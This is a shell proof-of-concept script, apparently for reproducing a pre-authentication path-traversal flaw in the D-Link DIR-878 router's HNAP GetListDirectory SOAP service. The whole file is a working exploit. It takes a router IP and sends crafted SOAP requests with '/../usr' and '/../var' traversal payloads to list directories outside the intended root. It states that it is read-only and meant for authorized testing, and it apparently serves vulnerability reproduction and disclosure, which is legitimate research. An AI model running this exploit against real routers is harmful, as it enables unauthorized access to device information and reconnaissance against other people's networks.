#!/bin/sh
# Reproduction script for: DIR-878 GetListDirectory path traversal (pre-auth, information disclosure)
# Derived from the request recorded in README.md. Read-only; nothing is written.
# Authorized testing only.
T="${1:?usage: sh poc.sh <router-ip>}"
req() {
  curl -s -X POST "http://$T/HNAP1/?GetCAPTCHAsetting" \
    -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetListDirectory"' \
    -H 'Content-Type: text/xml' \
    --data-binary "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetListDirectory xmlns=\"http://purenetworks.com/HNAP1/\"><ListDirectoryPath>$1</ListDirectoryPath></GetListDirectory></soap:Body></soap:Envelope>"
}
echo "[*] Baseline  /        (maps to /mnt)"; req "/"        | tr -d '\t' | head -20
echo; echo "[*] Traversal /../usr  -> /usr listing"; req "/../usr" | tr -d '\t' | head -20
echo; echo "[*] Traversal /../var  -> /var listing"; req "/../var" | tr -d '\t' | head -20
